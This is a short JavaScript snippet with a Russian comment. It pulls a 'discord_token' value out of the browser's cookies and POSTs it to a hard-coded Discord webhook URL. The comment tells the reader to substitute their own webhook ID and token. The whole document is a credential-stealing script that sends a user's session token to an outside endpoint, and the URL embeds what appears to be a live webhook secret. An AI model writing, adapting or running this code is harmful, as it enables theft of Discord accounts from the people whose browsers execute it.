const token = document.cookie.match(/^(?:.*;)?\s*discord_token\s*=\s*([^;]+)(?:.*)?$/)[1];
const webhookUrl = 'https://discord.com/api/webhooks/1093279255858790410/iKIwo2L-4ZWpIwZ2mHwMkM8Grn2ePCFwN0NDCn5iJg7rgRokW1B2_GcKStchM9aa8LrB'; // замените WEBHOOK_ID и WEBHOOK_TOKEN на свои значения

fetch(webhookUrl, {
  method: 'POST',
  body: JSON.stringify({ content: token }),
  headers: {
    'Content-Type': 'application/json'
  }
});